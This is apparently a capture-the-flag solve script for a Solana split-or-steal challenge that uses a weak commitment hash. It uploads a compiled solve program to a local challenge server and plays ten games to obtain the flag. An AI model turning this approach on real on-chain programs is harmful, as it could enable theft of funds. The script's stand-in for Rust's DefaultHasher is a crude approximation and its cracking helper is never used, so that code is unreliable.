import os

os.system("cargo build-sbf")

from pwn import *
from solders.pubkey import Pubkey as PublicKey
from solders.system_program import ID
import base58
import struct

# context.log_level = 'debug'

host = args.HOST or "localhost"
port = args.PORT or 5002


def create_commitment(choice, player_address_bytes):
    """Recreate the flawed commitment scheme using Rust's DefaultHasher logic"""
    data = bytes([choice]) + player_address_bytes
    # Simulate Rust's DefaultHasher behavior (SipHash13)
    # Using a simple hash that approximates the behavior
    hash_value = 0
    for byte in data:
        hash_value = hash_value * 31 + byte
    # Convert to 8-byte little-endian format, then pad to 32 bytes
    hash_bytes = struct.pack("<Q", hash_value & 0xFFFFFFFFFFFFFFFF)
    return hash_bytes + b"\x00" * 24


def crack_commitment(commitment, player_address):
    """Crack the commitment by trying both choices"""
    player_bytes = bytes(player_address)

    # Try choice = 0 (Split)
    commitment_split = create_commitment(0, player_bytes)

    # Try choice = 1 (Steal)
    commitment_steal = create_commitment(1, player_bytes)

    # Compare first 8 bytes (where the actual hash is stored)
    if commitment_split[:8] == commitment[:8]:
        return 0  # Split
    elif commitment_steal[:8] == commitment[:8]:
        return 1  # Steal
    else:
        return None  # Shouldn't happen


r = remote(host, port)
solve = open("target/deploy/solchal_solve.so", "rb").read()

# Send solve program
r.recvuntil(b"program pubkey: ")
# Generate a random pubkey for our solve program
import random

solve_pubkey = PublicKey(random.randbytes(32))
r.sendline(str(solve_pubkey).encode())
r.recvuntil(b"program len: ")
r.sendline(str(len(solve)).encode())
r.send(solve)

# Get game info
r.recvuntil(b"program: ")
program = PublicKey(base58.b58decode(r.recvline().strip().decode()))
r.recvuntil(b"player_one: ")
player_one = PublicKey(base58.b58decode(r.recvline().strip().decode()))
r.recvuntil(b"player_two: ")
player_two = PublicKey(base58.b58decode(r.recvline().strip().decode()))

print(f"Program: {program}")
print(f"Player One: {player_one}")
print(f"Player Two: {player_two}")

# Play 10 games, exploiting the commitment scheme
for game_num in range(10):
    print(f"\n=== Game {game_num + 1} ===")

    r.recvuntil(b"Game ")
    game_info = r.recvline().decode().strip()
    print(f"Game info: {game_info}")

    # Get the actual game account address from server
    r.recvuntil(b"game_account: ")
    game_account_str = r.recvline().decode().strip()
    game_account = PublicKey(base58.b58decode(game_account_str))
    print(f"Game account: {game_account}")

    # Wait for solve instruction prompt
    r.recvuntil(b"num accounts: ")
    r.sendline(b"4")  # Number of accounts: game, player_two, system_program, challenge_program

    # Send accounts: game, player_two, system_program, challenge_program
    r.sendline(b"w " + str(game_account).encode())  # Game account (writable)
    r.sendline(b"sw " + str(player_two).encode())  # Player two (signer, writable)
    r.sendline(b"r " + str(ID).encode())  # System program (readonly)
    r.sendline(b"r " + str(program).encode())  # Challenge program (readonly)

    r.recvuntil(b"ix len: ")
    r.sendline(b"0")  # No instruction data needed

    # Print result
    result = r.recvline().decode().strip()
    print(result)

# Get results
leak = r.recvuntil(b"Flag: ")
print(leak)
r.stream()
